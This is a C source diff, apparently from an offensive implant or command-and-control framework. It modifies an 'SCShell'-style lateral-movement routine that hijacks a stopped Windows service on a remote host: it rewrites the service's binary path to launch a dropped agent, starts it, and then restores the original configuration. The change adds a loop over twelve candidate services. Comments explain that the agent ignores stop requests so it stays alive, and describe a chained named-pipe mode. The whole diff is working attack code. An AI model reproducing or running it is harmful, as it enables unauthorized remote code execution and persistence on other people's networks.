@@ -1237,46 +1237,26 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
         return FALSE;
     }
 
-    /* 3. Open existing stoppable service — SensorService (common, usually stopped) */
-    const wchar_t *svcName = L"SensorService";
-    SC_HANDLE hSvc = pOpenSvc(hSCM, svcName, SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
-    if (!hSvc) {
-        /* Fallback: try BTAGService */
-        svcName = L"BTAGService";
-        hSvc = pOpenSvc(hSCM, svcName, SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
-    }
-    if (!hSvc) {
-        char err[128];
-        snprintf(err, sizeof(err), "[-] Failed to open target service (err=%lu)\n", GetLastError());
-        buf_append(out, err, (DWORD)strlen(err));
-        pCloseSH(hSCM);
-        pDeleteFile(remotePath);
-        return FALSE;
-    }
+    /* 3. Try candidate services until one is openable AND startable.
+     * Services that are already running (error 1056) are skipped.
+     * All are commonly stopped/disabled on modern Windows. */
+    static const wchar_t *svcCandidates[] = {
+        L"SensorService",       /* Sensor Monitoring Service */
+        L"BTAGService",         /* Bluetooth Audio Gateway */
+        L"PhoneSvc",            /* Phone Service */
+        L"TapiSrv",            /* Telephony */
+        L"WbioSrvc",           /* Windows Biometric Service */
+        L"icssvc",             /* Windows Mobile Hotspot */
+        L"WPDBusEnum",         /* Portable Device Enumerator */
+        L"MapsBroker",         /* Downloaded Maps Manager */
+        L"PcaSvc",             /* Program Compatibility Assistant */
+        L"lfsvc",              /* Geolocation Service */
+        L"RetailDemo",         /* Retail Demo */
+        L"wisvc",              /* Windows Insider Service */
+        NULL
+    };
 
-    /* 4. Save original binPath */
-    BYTE cfgBuf[8192];
-    DWORD needed = 0;
-    pQueryCfg(hSvc, (LPQUERY_SERVICE_CONFIGW)cfgBuf, sizeof(cfgBuf), &needed);
-    QUERY_SERVICE_CONFIGW *origCfg = (QUERY_SERVICE_CONFIGW *)cfgBuf;
-    wchar_t origBinPath[1024] = {0};
-    if (origCfg->lpBinaryPathName)
-        wcsncpy(origBinPath, origCfg->lpBinaryPathName, 1023);
-    DWORD origSvcType = origCfg->dwServiceType;
-    DWORD origStartType = origCfg->dwStartType;
-
-    char msg[256];
-    snprintf(msg, sizeof(msg), "[+] Hijacking service '%ls' on %ls\n", svcName, target);
-    buf_append(out, msg, (DWORD)strlen(msg));
-
-    /* 5. Change binPath AND type to OWN_PROCESS so the agent's
-     * StartServiceCtrlDispatcherW succeeds (SHARE_PROCESS requires
-     * matching service name which we can't know at compile time).
-     * The agent's _svc_ctrl_handler ignores STOP so SCM can't
-     * kill us cooperatively — we stay alive indefinitely.
-     *
-     * Chained mode: append "PIPE:<name>" so the child creates a named
-     * pipe and waits for us to auto-link. */
+    /* Chained mode: generate pipe name early so binPath can include it */
     char pipe_name[32] = {0};
     if (chained) {
         _jump_randname(pipe_name, 12);
@@ -1287,32 +1267,73 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
         swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs PIPE:%hs", fname, pipe_name);
     else
         swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs", fname);
-    pChangeCfg(hSvc, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
-               SERVICE_ERROR_IGNORE, newBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
-    /* 6. Start service — SCM launches our binary.  The agent registers
-     * via StartServiceCtrlDispatcherW and reports SERVICE_RUNNING with
-     * dwControlsAccepted=0, so StartServiceW returns quickly (success). */
-    BOOL startOk = pStartSvc(hSvc, 0, NULL);
-    DWORD startErr = GetLastError();
+    const wchar_t *svcName = NULL;
+    SC_HANDLE hSvc = NULL;
+    wchar_t origBinPath[1024] = {0};
+    DWORD origSvcType = 0, origStartType = 0;
+    BOOL started = FALSE;
+    char msg[256];
 
-    /* Error 1053 = timeout (shouldn't happen now that agent registers,
-     * but accept it as success just in case). */
-    if (!startOk && startErr != 1053) {
-        snprintf(msg, sizeof(msg), "[-] StartService failed (err=%lu)\n", startErr);
-        buf_append(out, msg, (DWORD)strlen(msg));
-        /* Restore and bail */
+    for (int ci = 0; svcCandidates[ci] != NULL; ci++) {
+        svcName = svcCandidates[ci];
+        hSvc = pOpenSvc(hSCM, svcName,
+                        SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
+        if (!hSvc) continue;
+
+        /* Save original config */
+        BYTE cfgBuf[8192];
+        DWORD needed = 0;
+        pQueryCfg(hSvc, (LPQUERY_SERVICE_CONFIGW)cfgBuf, sizeof(cfgBuf), &needed);
+        QUERY_SERVICE_CONFIGW *origCfg = (QUERY_SERVICE_CONFIGW *)cfgBuf;
+        origBinPath[0] = L'\0';
+        if (origCfg->lpBinaryPathName)
+            wcsncpy(origBinPath, origCfg->lpBinaryPathName, 1023);
+        origSvcType = origCfg->dwServiceType;
+        origStartType = origCfg->dwStartType;
+
+        /* Change binPath + type */
+        pChangeCfg(hSvc, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
+                   SERVICE_ERROR_IGNORE, newBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
+
+        /* Try to start */
+        BOOL startOk = pStartSvc(hSvc, 0, NULL);
+        DWORD startErr = GetLastError();
+
+        if (startOk || startErr == 1053) {
+            /* Success (1053 = timeout, acceptable) */
+            snprintf(msg, sizeof(msg), "[+] Hijacked service '%ls' on %ls\n", svcName, target);
+            buf_append(out, msg, (DWORD)strlen(msg));
+            started = TRUE;
+            break;
+        }
+
+        /* Restore config and try next service */
         pChangeCfg(hSvc, origSvcType, origStartType,
                    SERVICE_ERROR_IGNORE, origBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
         pCloseSH(hSvc);
+        hSvc = NULL;
+
+        if (startErr == 1056) {
+            /* Already running — try next candidate */
+            continue;
+        } else {
+            /* Unexpected error — log and try next */
+            snprintf(msg, sizeof(msg), "[!] Service '%ls' failed (err=%lu), trying next\n",
+                     svcName, startErr);
+            buf_append(out, msg, (DWORD)strlen(msg));
+        }
+    }
+
+    if (!started) {
+        BUF_STR(out, "[-] All candidate services failed — no stopped service available\n");
         pCloseSH(hSCM);
         pDeleteFile(remotePath);
         return FALSE;
     }
 
-    /* 7. Restore original config (type + start type + binPath).
-     * The agent process is already running and registered with SCM —
-     * restoring the config doesn't affect it. */
+    /* Restore original config. The agent process is already running —
+     * restoring doesn't affect it. */
     pChangeCfg(hSvc, origSvcType, origStartType,
                SERVICE_ERROR_IGNORE, origBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
